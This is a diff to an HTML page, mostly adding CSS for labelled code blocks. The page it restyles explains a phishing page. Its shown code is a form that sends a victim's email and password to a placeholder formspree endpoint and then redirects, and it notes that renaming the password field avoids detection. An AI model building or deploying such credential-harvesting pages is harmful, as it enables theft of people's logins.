@@ -73,6 +73,43 @@
                 font-size: 0.95rem;
             }
 
+            .code-block {
+                margin-bottom: 2rem;
+                border-radius: 8px;
+                background: #1e1e1e;
+                position: relative;
+                padding-top: 1rem;
+            }
+
+            .code-label {
+                position: absolute;
+                top: 0;
+                left: 0;
+                transform: translateY(-50%);
+                background-color: #444;
+                color: #ffffff;
+                padding: 0.4rem 1rem;
+                font-weight: bold;
+                font-size: 0.9rem;
+                font-family: "Fira Code", monospace;
+                width: 100%;
+                box-sizing: border-box;
+                border-top-left-radius: 8px;
+                border-top-right-radius: 8px;
+                border-bottom: 1px solid #444;
+                z-index: 1;
+            }
+
+            .code-block pre {
+                margin: 0;
+                padding: 1rem;
+                border-radius: 0 0 8px 8px;
+                background: transparent;
+                border: none;
+                position: relative;
+                z-index: 0;
+            }
+
             .download-button {
                 background-color: #1dc328;
                 color: white;
@@ -192,9 +229,9 @@
                 The page collects input from the user, in this case an email and
                 password.
             </p>
-
-            <p>HTML</p>
-            <pre><code class="language-html">&lt;form id="phishy-form" action="&lt;your formspree url&gt;" method="POST"&gt;
+            <div class="code-block">
+                <div class="code-label">HTML</div>
+                <pre><code class="language-html">&lt;form id="phishy-form" action="&lt;your formspree url&gt;" method="POST"&gt;
   &lt;label&gt;Email:&lt;/label&gt;
   &lt;input type="email" name="email" required /&gt;
 
@@ -203,8 +240,10 @@
 
   &lt;button id="my-form-button"&gt;Submit&lt;/button&gt;
 &lt;/form&gt;</code></pre>
-            <p>JavaScript</p>
-            <pre><code class="language-javascript">document
+            </div>
+            <div class="code-block">
+                <div class="code-label">JavaScript</div>
+                <pre><code class="language-javascript">document
     .getElementById("phishy-form")
     .addEventListener("submit", async function (e) {
     e.preventDefault();
@@ -219,6 +258,8 @@
         window.location.href = "https://www.example.com/";
     }
 }</code></pre>
+            </div>
+
             <p>
                 Note: The <code>name</code> attribute for the password field is
                 set to <code>userkey</code>. This avoids detection by
